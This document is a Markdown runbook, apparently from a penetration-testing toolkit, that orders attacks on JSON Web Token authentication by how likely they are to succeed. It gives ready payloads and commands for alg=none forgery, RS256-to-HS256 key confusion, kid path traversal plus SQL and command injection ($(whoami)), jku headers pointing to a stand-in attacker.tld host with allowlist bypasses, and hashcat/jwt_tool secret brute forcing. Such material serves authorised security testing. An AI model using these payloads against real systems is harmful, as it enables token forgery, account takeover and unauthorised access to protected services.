# JWT Attack Chooser (Runbook)

Decision tree for prioritizing JWT attacks in order of likelihood-to-pay-off.
Load `payloads/jwt_attacks.txt` for concrete header/claim bodies.

## Step 0 — Decode and fingerprint

```bash
H=$(echo "$JWT" | cut -d. -f1 | base64 -d 2>/dev/null); echo "$H" | jq
P=$(echo "$JWT" | cut -d. -f2 | base64 -d 2>/dev/null); echo "$P" | jq
```

Capture: `alg`, `kid`, `jku`, `x5u`, `x5c`, `iss`, `aud`, `sub`, `exp`, role/scope claims.

## Step 1 — alg=none

Cheapest attack; try first.

```
Header:  {"alg":"none","typ":"JWT"}
Payload: (unchanged but elevate role/sub if desired)
Signature: (empty)
```

Also try `None`, `NONE`, `nOnE` (some libs only blocklist lowercase).

If accepted (server returns 200 for protected resource) -> confirmed, CRITICAL,
`owasp_api_id: "API2:2023"`. STOP here; chain is over.

## Step 2 — Key confusion RS256 -> HS256

Only applicable if original `alg` is asymmetric (RS256, RS384, RS512, ES256, ES384, PS256, ...).

1. Obtain server's public key:
   - `/.well-known/jwks.json`, `/.well-known/openid-configuration`
   - TLS cert (`openssl s_client -connect target:443 | openssl x509 -pubkey -noout`)
   - Any public docs / JWKS endpoint referenced by `iss`
2. Re-sign the JWT with HS256 using the raw public-key bytes (PEM or DER — try both) as HMAC secret.
3. Ship the new token.

```bash
jwt_tool "$JWT" -X k -pk public.pem
```

If accepted -> CRITICAL, same OWASP mapping.

## Step 3 — kid traversal / injection

Only if original header carries a `kid`.

Try in order:
1. `kid: "../../../../dev/null"` (HMAC key becomes empty string -> sign with "")
2. `kid: "/dev/null"`
3. `kid: "../../etc/hostname"` (HMAC key = known file contents)
4. `kid: "' UNION SELECT 'AAAA' -- "` (SQLi -> controlled key value returned)
5. `kid: "$(whoami)"` / backticks (command injection in kid lookup)

For #1/2: sign with empty HMAC secret. For #3: sign with the file contents
fetched via a separate vector or guessed. For #4: sign with `'AAAA'`.

```bash
jwt_tool "$JWT" -X i -I -hc kid -hv "../../../dev/null" -S hs256 -p ""
```

## Step 4 — jku / x5u header injection

Only if server trusts header-supplied JWKS URLs.

1. Host attacker JWKS at `https://attacker.tld/jwks.json`.
2. Craft header: `{"alg":"RS256","jku":"https://attacker.tld/jwks.json","typ":"JWT","kid":"mine"}`.
3. Sign with the matching private key you put in the JWKS.

Bypass tricks for host-allowlists:
- `jku: "https://target.tld@attacker.tld/jwks.json"` (userinfo abuse)
- `jku: "https://target.tld.attacker.tld/jwks.json"` (subdomain confusion)
- URL-encoded `@`, `#`, redirects through trusted host

## Step 5 — Weak-secret brute force

Falls back here when alg is HS256/384/512 and no header abuse worked.

```bash
jwt_tool "$JWT" -C -d /path/to/wordlist.txt
hashcat -a 0 -m 16500 jwt.txt rockyou.txt
```

Wordlists to try in order:
1. Short project-specific list from `payloads/jwt_attacks.txt`
2. `rockyou.txt`
3. `seclists/Passwords/Common-Credentials/10k-most-common.txt`

Expected time: seconds to minutes for weak secrets, abandon after ~30 min with
strong wordlist unless you have reason to keep going.

## Step 6 — Claim tampering without signature break

Some servers verify sig but fail to validate claims:
- `exp` removed / set far in the future -> token renewal-of-life
- `iss` changed to another trusted issuer -> cross-tenant confusion
- Role/scope/permissions claims elevated -> if server trusts JWT role claim instead of DB lookup

Only useful when you already have a valid signing key (from step 2, 3, 4, or 5)
or when server doesn't verify signatures at all (rare but happens).

## Step 7 — Meta issues (check always, they are free)

- Token not invalidated on logout
- Token still valid after password change
- Sensitive PII in payload (SSN, credit card, MFA seed)
- Long `exp` (> 24h for user tokens)
- No `aud` / `iss` validation
- Refresh token never rotates

Record per `schemas/finding.json` with `owasp_api_id: "API2:2023"` (auth) or
`API8:2023` (misconfig) as appropriate.
